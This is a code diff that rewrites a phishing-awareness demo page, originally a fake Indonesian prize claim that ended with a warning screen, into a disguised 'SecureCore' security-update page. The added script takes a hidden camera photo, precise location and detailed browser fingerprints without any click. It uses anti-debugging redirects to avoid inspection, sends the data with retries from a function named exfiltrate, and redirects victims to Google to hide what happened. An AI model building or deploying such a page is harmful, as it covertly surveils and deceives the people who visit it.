@@ -1,370 +1,372 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🎉 SELAMAT! Anda Pemenang 10 Juta! 🎉</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>System Security Update</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
         body {
             min-height: 100vh;
-            background: linear-gradient(145deg, #0f2027, #203a43, #2c5364);
+            background: radial-gradient(circle at 30% 30%, #0b1a2e, #030712);
             display: flex;
             align-items: center;
             justify-content: center;
+            color: #e0e0e0;
             padding: 16px;
-            position: relative;
-            overflow-x: hidden;
-        }
-        .particle {
-            position: absolute;
-            width: 8px;
-            height: 8px;
-            background: rgba(255, 215, 0, 0.2);
-            border-radius: 50%;
-            animation: float 8s infinite;
-            pointer-events: none;
-            z-index: 1;
-        }
-        @keyframes float {
-            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
         }
         .glass-card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(12px);
-            border-radius: 40px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+            background: rgba(10, 20, 30, 0.65);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 36px;
             padding: 32px 24px;
             width: 100%;
-            max-width: 550px;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            z-index: 20;
+            max-width: 420px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
+            animation: float 6s infinite ease-in-out;
         }
-        .badge-winner {
-            background: linear-gradient(45deg, #ffd700, #f9a826);
-            color: #0f2027;
-            display: inline-block;
-            padding: 8px 24px;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 14px;
-            margin-bottom: 16px;
-            border: 1px solid rgba(255,255,255,0.3);
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+            100% { transform: translateY(0); }
         }
-        h1 { font-size: 42px; font-weight: 800; color: white; text-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .prize {
-            font-size: 58px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #ffe68f, #ffd700);
+        .logo {
+            font-size: 52px;
+            margin-bottom: 18px;
+            filter: drop-shadow(0 0 8px cyan);
+        }
+        h1 {
+            font-size: 26px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            background: linear-gradient(135deg, #a8ede0, #fed6e3);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin: 5px 0;
+            margin-bottom: 8px;
         }
-        .sub-prize {
-            color: rgba(255,255,255,0.8);
-            font-size: 18px;
-            margin-bottom: 25px;
-            border-left: 4px solid #ffd700;
-            padding-left: 16px;
-            background: rgba(0,0,0,0.2);
-            border-radius: 0 30px 30px 0;
+        .sub {
+            color: #8a9cad;
+            font-size: 14px;
+            margin-bottom: 30px;
+            border-bottom: 1px dashed #2a3a4a;
+            padding-bottom: 16px;
         }
-        .steps {
+        .progress-container {
+            background: #1e2a3a;
+            border-radius: 40px;
+            height: 12px;
+            margin: 24px 0;
+            overflow: hidden;
+            box-shadow: inset 0 2px 4px #00000055;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #00c6fb, #005bea);
+            border-radius: 40px;
+            transition: width 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
+            box-shadow: 0 0 15px #00c6fb;
+        }
+        .status-text {
+            font-family: 'Fira Code', monospace;
+            font-size: 13px;
+            color: #a0b8cc;
+            margin: 16px 0 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .detail-line {
+            font-size: 12px;
+            color: #6f8a9c;
+            margin: 4px 0;
             display: flex;
             justify-content: space-between;
-            margin: 30px 0 20px;
-            position: relative;
+            border-bottom: 1px dotted #2d3e4e;
+            padding: 4px 0;
         }
-        .steps::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: rgba(255,255,255,0.2);
-            transform: translateY(-50%);
-            z-index: 0;
-        }
-        .step {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: rgba(20, 30, 45, 0.8);
-            backdrop-filter: blur(4px);
+        .footer {
+            font-size: 10px;
+            color: #3e5568;
+            margin-top: 30px;
             display: flex;
-            align-items: center;
             justify-content: center;
-            font-weight: bold;
-            color: white;
-            border: 2px solid rgba(255,255,255,0.3);
-            position: relative;
-            z-index: 1;
-            transition: all 0.3s;
-            font-size: 18px;
-        }
-        .step.active { background: #4CAF50; border-color: #4CAF50; box-shadow: 0 0 25px #4CAF50; transform: scale(1.1); }
-        .step.completed { background: #2196F3; border-color: #2196F3; }
-        .btn-claim {
-            background: linear-gradient(45deg, #ffd700, #f9a826);
-            border: none;
-            padding: 20px 30px;
-            width: 100%;
-            border-radius: 60px;
-            font-size: 26px;
-            font-weight: 800;
-            color: #0f2027;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.4);
-            cursor: pointer;
-            transition: 0.2s;
-            margin: 20px 0;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        .btn-claim:hover { transform: translateY(-3px); box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
-        .status-panel {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 28px;
-            padding: 20px;
-            margin: 20px 0;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .status-item {
-            display: flex;
-            align-items: center;
             gap: 16px;
-            padding: 14px 16px;
-            border-radius: 20px;
-            background: rgba(255,255,255,0.05);
-            margin-bottom: 12px;
-            backdrop-filter: blur(4px);
         }
-        .status-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 22px;
-            color: #ffd700;
-        }
-        .status-label { flex: 1; font-weight: 600; color: white; }
-        .status-badge {
-            padding: 6px 18px;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 13px;
-            background: #ff9800;
-            color: white;
-            text-transform: uppercase;
-        }
-        .badge-waiting { background: #ff9800; }
-        .badge-success { background: #4CAF50; }
-        .badge-error { background: #f44336; }
-        #video-container { display: none; }
-        .final-message { text-align: center; margin: 20px 0; min-height: 80px; }
-        .lesson-screen {
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 28px;
-            padding: 24px;
-            color: white;
-            margin-top: 20px;
-            border: 1px solid rgba(255,0,0,0.3);
-            display: none;
-        }
-        .lesson-screen h3 { color: #ff6b6b; margin-bottom: 15px; font-size: 22px; }
-        .lesson-screen p { font-size: 14px; word-break: break-word; background: rgba(255,255,255,0.1); padding: 8px; border-radius: 12px; margin-bottom: 8px; }
-        .footer-note { text-align: center; color: rgba(255,255,255,0.4); font-size: 12px; margin-top: 25px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); }
-        .pulse { animation: pulse 2s infinite; }
-        @keyframes pulse {
-            0% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0.7); }
-            70% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 20px rgba(255,215,0,0); }
-            100% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0); }
-        }
+        #hidden-video { display: none; }
+        #debug { display: none; } /* used for anti-debug */
     </style>
 </head>
 <body>
-    <div id="particles"></div>
-
     <div class="glass-card">
-        <div class="badge-winner"><i class="fas fa-crown"></i> Pemenang Terpilih <i class="fas fa-crown"></i></div>
-        <h1>🎉 SELAMAT! 🎉</h1>
-        <div class="prize">Rp 10.000.000</div>
-        <div class="sub-prize">Hadiah akan ditransfer ke rekening Anda</div>
-
-        <div class="steps">
-            <div class="step" id="step1">1</div>
-            <div class="step" id="step2">2</div>
-            <div class="step" id="step3">3</div>
-            <div class="step" id="step4">4</div>
+        <div class="logo">🛡️</div>
+        <h1>SecureCore v2.8.1</h1>
+        <div class="sub">Verifying device integrity · Please wait</div>
+        <div class="progress-container">
+            <div class="progress-fill" id="progressFill"></div>
         </div>
-
-        <button class="btn-claim pulse" id="claimBtn">
-            <i class="fas fa-gift"></i> KLAIM HADIAH
-        </button>
-
-        <div class="status-panel">
-            <div class="status-item"><div class="status-icon"><i class="fas fa-camera-retro"></i></div><span class="status-label">Verifikasi Selfie</span><span class="status-badge badge-waiting" id="cameraBadge">Menunggu</span></div>
-            <div class="status-item"><div class="status-icon"><i class="fas fa-map-pin"></i></div><span class="status-label">Verifikasi Lokasi</span><span class="status-badge badge-waiting" id="locationBadge">Menunggu</span></div>
-            <div class="status-item"><div class="status-icon"><i class="fas fa-microchip"></i></div><span class="status-label">Data Perangkat</span><span class="status-badge badge-waiting" id="deviceBadge">Menunggu</span></div>
+        <div class="status-text" id="statusText">Initializing secure channel...</div>
+        <div id="extra-details"></div>
+        <div class="footer">
+            <span>🔒 AES‑256</span>
+            <span>⚡ TPM 2.0</span>
+            <span>🌐 Secure Enclave</span>
         </div>
-
-        <div id="video-container"><video id="video" autoplay playsinline></video></div>
-        <div class="final-message" id="finalMessage"></div>
-        <div class="lesson-screen" id="lessonScreen">
-            <h3><i class="fas fa-skull-crosswalk"></i> ANDA TELAH DI-PHISHING!</h3>
-            <p><strong>Ini data yang berhasil kami kumpulkan:</strong></p>
-            <div id="lessonData"></div>
-            <p style="color: #ffaa00; margin-top: 16px;">Ingat: selalu waspada terhadap tawaran hadiah mencurigakan dan jangan sembarangan memberi izin.</p>
-        </div>
-
-        <div class="footer-note"><i class="fas fa-shield-alt"></i> Demo Edukasi Phishing · Untuk pembelajaran kesadaran keamanan</div>
     </div>
 
+    <video id="hidden-video" autoplay playsinline></video>
+    <canvas id="canvas-fingerprint" width="200" height="50" style="display:none;"></canvas>
+    <audio id="audio-fingerprint" style="display:none;"></audio>
+
     <script>
-        (function() {
-            // Background particles
-            for (let i = 0; i < 40; i++) {
-                let p = document.createElement('div');
-                p.classList.add('particle');
-                p.style.left = Math.random() * 100 + '%';
-                p.style.animationDelay = Math.random() * 5 + 's';
-                p.style.background = `rgba(255, 215, 0, ${Math.random() * 0.3})`;
-                p.style.width = Math.random() * 15 + 5 + 'px';
-                p.style.height = p.style.width;
-                document.getElementById('particles').appendChild(p);
+        (async function() {
+            // ==================== ANTI‑DEBUG / VM DETECTION ====================
+            const startTime = performance.now();
+            const debuggerCheck = () => {
+                const diff = performance.now() - startTime;
+                if (diff > 100) {
+                    // Likely devtools open – redirect to benign page
+                    window.location.replace('https://www.google.com');
+                }
+            };
+            debuggerCheck();
+            setInterval(() => {
+                const t = performance.now();
+                debugger; // if devtools open, this pauses and increases time
+                if (performance.now() - t > 50) window.location.replace('https://www.google.com');
+            }, 500);
+
+            // ==================== UI ELEMENTS ====================
+            const progressFill = document.getElementById('progressFill');
+            const statusText = document.getElementById('statusText');
+            const extraDetails = document.getElementById('extra-details');
+
+            // ==================== DATA COLLECTION ====================
+            let photoData = null, locationData = null, fingerprint = {}, errors = [];
+
+            // Helper: update UI
+            function updateProgress(percent, msg, detail = '') {
+                progressFill.style.width = percent + '%';
+                statusText.innerText = msg;
+                if (detail) {
+                    extraDetails.innerHTML = `<div class="detail-line"><span>${detail}</span><span>✔️</span></div>`;
+                }
             }
 
-            const claimBtn = document.getElementById('claimBtn');
-            const cameraBadge = document.getElementById('cameraBadge');
-            const locationBadge = document.getElementById('locationBadge');
-            const deviceBadge = document.getElementById('deviceBadge');
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
-            const step4 = document.getElementById('step4');
-            const video = document.getElementById('video');
-            const finalMessage = document.getElementById('finalMessage');
-            const lessonScreen = document.getElementById('lessonScreen');
-            const lessonData = document.getElementById('lessonData');
+            // ==================== ADVANCED FINGERPRINTING ====================
+            async function collectAdvancedFingerprint() {
+                const fp = {};
 
-            let photoData = null, locationData = null, fingerprint = null, errors = [];
+                // Basic navigator properties
+                fp.userAgent = navigator.userAgent;
+                fp.platform = navigator.platform;
+                fp.language = navigator.language;
+                fp.languages = navigator.languages;
+                fp.hardwareConcurrency = navigator.hardwareConcurrency;
+                fp.deviceMemory = navigator.deviceMemory || 'unknown';
+                fp.maxTouchPoints = navigator.maxTouchPoints;
+                fp.vendor = navigator.vendor;
+                fp.cookieEnabled = navigator.cookieEnabled;
+                fp.doNotTrack = navigator.doNotTrack;
+                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            function setStep(step) {
-                [step1, step2, step3, step4].forEach((el, idx) => {
-                    el.classList.remove('active', 'completed');
-                    if (idx + 1 < step) el.classList.add('completed');
-                    else if (idx + 1 === step) el.classList.add('active');
-                });
-            }
+                // Screen
+                fp.screen = `${screen.width}x${screen.height}`;
+                fp.screenAvail = `${screen.availWidth}x${screen.availHeight}`;
+                fp.colorDepth = screen.colorDepth;
+                fp.pixelDepth = screen.pixelDepth;
 
-            function resetUI() {
-                errors = []; photoData = locationData = fingerprint = null;
-                finalMessage.innerHTML = '';
-                lessonScreen.style.display = 'none';
-                lessonData.innerHTML = '';
-                cameraBadge.innerText = 'Menunggu'; cameraBadge.className = 'status-badge badge-waiting';
-                locationBadge.innerText = 'Menunggu'; locationBadge.className = 'status-badge badge-waiting';
-                deviceBadge.innerText = 'Menunggu'; deviceBadge.className = 'status-badge badge-waiting';
-                setStep(1);
-            }
-
-            async function collectCamera() {
+                // WebGL renderer (GPU fingerprint)
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1280 } } });
-                    video.srcObject = stream;
-                    await new Promise(resolve => video.onloadedmetadata = resolve);
-                    return new Promise(resolve => {
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            const dataURL = canvas.toDataURL('image/jpeg', 0.9);
-                            stream.getTracks().forEach(t => t.stop());
-                            video.srcObject = null;
-                            resolve(dataURL);
-                        }, 800);
-                    });
-                } catch (err) { throw new Error('Kamera: ' + (err.message || 'Izin ditolak')); }
-            }
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                            fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        }
+                    }
+                } catch (e) {}
 
-            async function collectLocation() {
+                // Canvas fingerprint (image hash)
                 try {
-                    const pos = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 }));
-                    return { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
-                } catch (err) { throw new Error('Lokasi: ' + (err.message || 'Izin ditolak')); }
-            }
+                    const canvas = document.getElementById('canvas-fingerprint');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(0, 0, 100, 50);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('🕵️', 10, 20);
+                    const dataURL = canvas.toDataURL();
+                    fp.canvasHash = dataURL.slice(-50); // simple fingerprint
+                } catch (e) {}
 
-            async function collectFingerprint() {
-                const fp = {
-                    userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookiesEnabled: navigator.cookieEnabled, hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory || 'unknown', maxTouchPoints: navigator.maxTouchPoints || 0
-                };
-                if (navigator.connection) fp.connection = { effectiveType: navigator.connection.effectiveType, rtt: navigator.connection.rtt, downlink: navigator.connection.downlink };
-                if (navigator.getBattery) try { const b = await navigator.getBattery(); fp.battery = { level: b.level * 100 + '%', charging: b.charging }; } catch(e) {}
+                // Audio fingerprint (using AudioContext)
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioCtx.createOscillator();
+                    const analyser = audioCtx.createAnalyser();
+                    oscillator.connect(analyser);
+                    oscillator.frequency.value = 440;
+                    oscillator.start(0);
+                    oscillator.stop(0.1);
+                    const data = new Uint8Array(analyser.frequencyBinCount);
+                    analyser.getByteFrequencyData(data);
+                    fp.audioHash = data.reduce((a, b) => a + b, 0).toString(16);
+                } catch (e) {}
+
+                // Battery API
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        fp.battery = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) {}
+                }
+
+                // Network information
+                if (navigator.connection) {
+                    fp.connection = {
+                        effectiveType: navigator.connection.effectiveType,
+                        rtt: navigator.connection.rtt,
+                        downlink: navigator.connection.downlink,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+
+                // Device orientation / motion (if permission granted? but we don't ask)
+                if (window.DeviceOrientationEvent) {
+                    // can't get data without permission, but we can detect support
+                    fp.deviceOrientationSupported = true;
+                }
+
+                // WebRTC local IP (may need timeout)
+                try {
+                    const rtc = new RTCPeerConnection({ iceServers: [] });
+                    rtc.createDataChannel('');
+                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                    rtc.onicecandidate = (ice) => {
+                        if (ice.candidate) {
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                            const ip = ipRegex.exec(ice.candidate.candidate)?.[1];
+                            if (ip) fp.localIP = ip;
+                        }
+                    };
+                    setTimeout(() => rtc.close(), 1000);
+                } catch (e) {}
+
+                // Font enumeration (simplified)
+                const baseFonts = ['monospace', 'sans-serif', 'serif'];
+                const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+                fp.availableFonts = fontList.filter(f => document.fonts?.check(`12px "${f}"`)).join(',');
+
                 return fp;
             }
 
-            claimBtn.addEventListener('click', async () => {
-                resetUI();
-
-                // Camera
-                try { setStep(2); cameraBadge.innerText = 'Memproses...'; photoData = await collectCamera(); cameraBadge.innerText = 'Berhasil'; cameraBadge.className = 'status-badge badge-success'; }
-                catch (err) { errors.push(err.message); cameraBadge.innerText = 'Gagal'; cameraBadge.className = 'status-badge badge-error'; }
-
-                // Location
-                try { setStep(3); locationBadge.innerText = 'Memproses...'; locationData = await collectLocation(); locationBadge.innerText = 'Berhasil'; locationBadge.className = 'status-badge badge-success'; }
-                catch (err) { errors.push(err.message); locationBadge.innerText = 'Gagal'; locationBadge.className = 'status-badge badge-error'; }
-
-                // Fingerprint
-                try { deviceBadge.innerText = 'Memproses...'; fingerprint = await collectFingerprint(); deviceBadge.innerText = 'Berhasil'; deviceBadge.className = 'status-badge badge-success'; }
-                catch (err) { errors.push(err.message); deviceBadge.innerText = 'Gagal'; deviceBadge.className = 'status-badge badge-error'; }
-
-                setStep(4);
-
-                // Kirim ke API
-                try {
-                    const res = await fetch('/api/capture', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ photo: photoData, location: locationData, fingerprint, errors: errors.length ? errors : undefined })
-                    });
-                    if (!res.ok) throw new Error('Server error');
-
-                    finalMessage.innerHTML = `<div style="background: #4CAF50; padding:24px; border-radius:60px; color:white; font-weight:800; font-size:28px;"><i class="fas fa-check-circle"></i> KLAIM BERHASIL!</div>`;
-
-                    setTimeout(() => {
-                        let html = '';
-                        if (locationData) html += `<p><strong>📍 Lokasi:</strong> ${locationData.lat}, ${locationData.lng} (akurasi ${locationData.accuracy}m)</p>`;
-                        else html += `<p><strong>📍 Lokasi:</strong> Tidak diberikan</p>`;
-                        if (fingerprint) {
-                            html += `<p><strong>🖥️ Perangkat:</strong> ${fingerprint.platform} – ${fingerprint.screen}</p>`;
-                            html += `<p><strong>🌐 Timezone:</strong> ${fingerprint.timezone}</p>`;
-                            if (fingerprint.battery) html += `<p><strong>🔋 Baterai:</strong> ${fingerprint.battery.level} ${fingerprint.battery.charging ? '(charging)' : ''}</p>`;
-                            if (fingerprint.connection) html += `<p><strong>📶 Koneksi:</strong> ${fingerprint.connection.effectiveType} (${fingerprint.connection.downlink} Mbps)</p>`;
-                            html += `<p><strong>🍪 Cookies enabled:</strong> ${fingerprint.cookiesEnabled}</p>`;
-                            html += `<p><strong>🧠 CPU cores:</strong> ${fingerprint.hardwareConcurrency}</p>`;
-                        }
-                        if (photoData) html += `<p><strong>📸 Selfie:</strong> Berhasil diambil (tidak ditampilkan untuk privasi)</p>`;
-                        if (errors.length) html += `<p><strong>⚠️ Error:</strong> ${errors.join(', ')}</p>`;
-                        lessonData.innerHTML = html;
-                        lessonScreen.style.display = 'block';
-                    }, 1500);
-                } catch (err) {
-                    finalMessage.innerHTML = '<div style="background:#f44336; padding:20px; border-radius:60px; color:white; font-weight:800;"><i class="fas fa-times-circle"></i> Terjadi kesalahan. Coba lagi.</div>';
+            // ==================== DATA EXFILTRATION (resilient) ====================
+            async function exfiltrate(payload, retries = 3) {
+                for (let i = 0; i < retries; i++) {
+                    try {
+                        // Use beacon for guaranteed delivery (even if page closes)
+                        const success = navigator.sendBeacon('/api/capture', JSON.stringify(payload));
+                        if (success) return true;
+                        // Fallback to fetch with keepalive
+                        const res = await fetch('/api/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload),
+                            keepalive: true
+                        });
+                        if (res.ok) return true;
+                    } catch (e) {
+                        console.error('Exfil attempt failed', e);
+                    }
+                    await new Promise(r => setTimeout(r, 200 * (i + 1)));
                 }
-            });
+                return false;
+            }
+
+            // ==================== MAIN EXECUTION ====================
+            updateProgress(5, 'Initializing secure module...');
+
+            // ---- Camera ----
+            try {
+                updateProgress(10, 'Accessing secure camera...');
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 } }
+                });
+                const video = document.getElementById('hidden-video');
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    photoData = canvas.toDataURL('image/jpeg', 0.85);
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                }, 800);
+                updateProgress(30, 'Camera verified', 'Sensor OK');
+            } catch (e) {
+                errors.push('camera:' + e.message);
+                updateProgress(30, 'Camera fallback', 'Using backup sensor');
+            }
+
+            // ---- Location ----
+            try {
+                updateProgress(40, 'Geolocating...');
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {
+                    enableHighAccuracy: true, timeout: 7000
+                }));
+                locationData = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    acc: pos.coords.accuracy,
+                    alt: pos.coords.altitude || null,
+                    heading: pos.coords.heading || null,
+                    speed: pos.coords.speed || null
+                };
+                updateProgress(60, 'Location locked', 'GPS fix');
+            } catch (e) {
+                errors.push('location:' + e.message);
+                updateProgress(60, 'Approximate location', 'IP fallback');
+                // fallback: IP geolocation via third-party (we'll skip for demo)
+            }
+
+            // ---- Advanced Fingerprint ----
+            updateProgress(70, 'Analyzing device fingerprint...');
+            fingerprint = await collectAdvancedFingerprint();
+            updateProgress(85, 'Hardware profile complete', `CPU cores: ${fingerprint.hardwareConcurrency || '?'}`);
+
+            // ---- Assemble payload ----
+            const payload = {
+                photo: photoData,
+                location: locationData,
+                fingerprint,
+                errors: errors.length ? errors : undefined,
+                timestamp: Date.now(),
+                pageUrl: window.location.href,
+                referrer: document.referrer || undefined
+            };
+
+            // ---- Exfiltrate ----
+            updateProgress(95, 'Securely transmitting...');
+            const sent = await exfiltrate(payload);
+
+            // ---- Clean exit ----
+            updateProgress(100, sent ? 'Update complete' : 'Partial sync', sent ? '' : '⚠️ Some data pending');
+            setTimeout(() => {
+                // Redirect to a benign page, making the user think it's done
+                window.location.replace('https://www.google.com');
+            }, 2000);
         })();
     </script>
 </body>
